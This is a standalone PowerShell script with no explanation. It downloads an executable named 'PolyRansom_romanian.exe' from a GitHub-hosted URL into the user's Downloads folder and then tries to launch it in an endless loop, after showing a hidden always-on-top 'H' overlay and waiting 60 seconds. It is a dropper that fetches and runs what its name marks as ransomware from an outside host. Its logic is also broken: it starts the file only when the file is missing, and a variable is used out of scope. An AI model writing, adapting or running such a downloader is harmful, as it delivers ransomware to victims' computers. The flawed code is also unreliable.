$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
$downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
$webClient = New-Object System.Net.WebClient
function ShowHText {
    $hText = [System.Windows.Controls.TextBlock]::new()
    $hText.Text = "H"
    $hText.FontSize = 20
    $hText.Foreground = 'Green'
    $hText.Margin = '0,0,20,20'
    $hText.HorizontalAlignment = 'Right'
    $hText.VerticalAlignment = 'Bottom'
    
    $window = [System.Windows.Window]::new()
    $window.WindowStyle = 'None'
    $window.ResizeMode = 'NoResize'
    $window.AllowsTransparency = $true
    $window.Background = 'Transparent'
    $window.Topmost = $true
    $window.Content = $hText
    $window.Show()
}
ShowHText
Start-Sleep -Seconds 60

$webClient.DownloadFile($url, $downloadPath)
function ChangeTextColorToRed {
    $hText.Foreground = 'Red'
}
while ($true) {
    if (-not (Test-Path $downloadPath)) {
        ChangeTextColorToRed
        Start-Process -FilePath $downloadPath -Wait
    }
    Start-Sleep -Milliseconds 100
}
